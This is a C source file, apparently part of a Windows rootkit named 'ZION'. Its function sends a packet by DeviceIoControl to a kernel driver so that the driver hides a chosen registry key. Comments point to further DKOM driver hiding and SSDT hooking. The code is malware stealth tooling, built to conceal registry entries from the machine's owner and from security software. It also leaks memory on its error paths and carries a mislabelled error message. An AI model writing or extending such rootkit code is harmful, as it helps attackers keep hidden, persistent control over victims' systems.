/*
 *      name: ZION system Register User
 *      Org Author: Liang Chen
 *      Version : 0.2
 */
#include "zion_hive_routine_registry.h"



STD_EXPORT(ZIONRESULT) Hive_HideRegistryByPath(WCHAR *RegKeyPath)
{
	PZION_CS_PACKET ptrZION_Hive_Packet;
	PZION_HIVE_REG_HOOK_CMD_DATA ptrHiveData;
	ptrZION_Hive_Packet = (PZION_CS_PACKET)malloc(sizeof(ZION_CS_PACKET));
	if (NULL == ptrZION_Hive_Packet)
	{
		printf("ZION: Memory alloc failed in Hive_HideRegistryByPath\n");
		return ZION_MEMORY_ALLOC_FAIL;
	}
	ptrHiveData = (PZION_HIVE_REG_HOOK_CMD_DATA)malloc(sizeof(ZION_HIVE_REG_HOOK_CMD_DATA));
	if (NULL == ptrHiveData)
	{
		printf("ZION: Memory alloc failed in Hive_HideRegistryByPath\n");
		return ZION_MEMORY_ALLOC_FAIL;
	}
	if (ZION_OK != Hive_SetHiveData(ptrHiveData,
		RegKeyPath))
	{
		printf("ZION: Error in Hive_HideRegistryByPath\n");
		return ZION_ERROR;
	}
	if (ZION_OK != ZION_SetPacketValue(ptrZION_Hive_Packet,
		CMD_HIVE_REG_HOOK,
		ptrHiveData,
		sizeof(ZION_HIVE_REG_HOOK_CMD_DATA)))
	{
		printf("ZION: Error in Hive_HideRegistryByPath\n");
		return ZION_ERROR;
	}

	DWORD dwReceived;
	//Maybe need to judge whether g_hZionServer_Dev is NULL
	if (!DeviceIoControl(g_hZionServer_Dev,
		IOCTL_ZION_CS_PKT_CMD,
		(LPVOID) ptrZION_Hive_Packet,
		sizeof(ZION_CS_PACKET),
		NULL,
		0,
		&dwReceived,
		NULL))
	{
		printf("ZION: Device IO CTRL Error in DKOM_HideDriverByName\n");
		free(ptrZION_Hive_Packet);
		free(ptrHiveData);
		return ZION_ERROR;
	}
	//printf("ZION: DKOM HIDE MODULE %s Succeed\n", DriverFileName);
	free(ptrZION_Hive_Packet);
	free(ptrHiveData);
	return ZION_OK;
	//ZION_SetPacketValue(ptrZION_SSDT_Packet, CMD_SSDT_HOOK, 
}
ZIONRESULT Hive_SetHiveData(PZION_HIVE_REG_HOOK_CMD_DATA data,
							   WCHAR *RegKeyPath)
{
	wcscpy_s(data->RegKeyPath,MAX_REGISTRY_KEY_PATH ,RegKeyPath); 
	return ZION_OK;
}